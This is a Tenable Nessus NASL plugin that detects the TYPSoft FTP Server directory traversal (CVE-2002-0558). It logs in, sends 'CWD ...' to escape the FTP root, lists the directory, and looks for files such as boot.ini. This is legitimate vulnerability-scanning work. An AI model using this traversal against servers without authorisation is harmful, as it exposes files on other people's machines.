#
# (C) Tenable Network Security, Inc.
#

# References:
#
# From: support@securiteam.com
# To: list@securiteam.com
# Date: 18 Dec 2002 00:40:44 +0200
# Subject: [NT] TYPSoft FTP Server Directory Traversal Vulnerability

include("compat.inc");

if(description)
{
  script_id(14706);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2014/12/26 13:58:57 $");

  script_bugtraq_id(2489);
  script_osvdb_id(6798);
  script_cve_id("CVE-2002-0558");

  script_name(english:"TYPSoft FTP Server LIST Command Traversal Arbitrary Directory Listing");
  script_summary(english:"FTP directory traversal using 'cd ...'");

  script_set_attribute(attribute:"synopsis", value:
"The FTP server is affected by a directory traversal Vulnerability.");
  script_set_attribute(attribute:"description", value:
"Using 'cd ...', it is possible to move from the FTP server root 
directory and access any file on the remote machine.");
  script_set_attribute(attribute:"solution", value:
"Contact your vendor for a fix.

If you are using TYPSoft FTP Server, update to 0.99.13 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/13");
  script_set_attribute(attribute:"vuln_publication_date", value: "2002/04/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english: "FTP");

  script_copyright(english:"This script is Copyright (C) 2004-2014 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("ftp/login");
  exit(0);
}

#
# The script code starts here
#
include('audit.inc');
include('global_settings.inc');
include("ftp_func.inc");

port = get_ftp_port(default: 21);

if (!thorough_tests)
{
 banner = get_ftp_banner(port:port);
 if (! banner) audit(AUDIT_NO_BANNER, port);
 if ( "TYPSoft FTP Server" >!< banner)
   audit(AUDIT_NOT_LISTEN, 'TYPSoft', port);
}

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

if (!login)
{
  if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);
  login = "anonymous";
}
if (!pass)
{
  if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);
  pass = "test@test.com";
}

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

if (! ftp_authenticate(socket:soc, user:login, pass:pass))
  exit(1, "Could not authenticate on the FTP server on port "+port+".");

for (i = 0; i < 1; i ++)
{
  r = ftp_send_cmd(socket: soc, cmd: 'CWD ...');
  debug_print(level: 2, 'CWD ... => ', substr(r, 0, 3));
  # EFTP is vulnerable to a similar bug but it says "permission denied"
  if (! thorough_tests && r !~ '^2[0-9][0-9] ') break;
}
port2 = ftp_pasv(socket: soc);
if (! port2) exit(1, "PASV command failed on port "+port+".");

soc2 = open_sock_tcp(port2, transport: ENCAPS_IP);
if (soc2)
{
  r = ftp_send_cmd(socket: soc, cmd: 'LIST');
  l = recv(socket: soc2, length: 2048);
  if (egrep(string: l, pattern: 'autoexec.bat|boot.ini', icase: 1))
  {
    security_warning(port);
    ftp_close(socket: soc);
    exit(0);
  }
}
if (soc2) close(soc2);
audit(AUDIT_LISTEN_NOT_VULN, 'FTP Server', port);
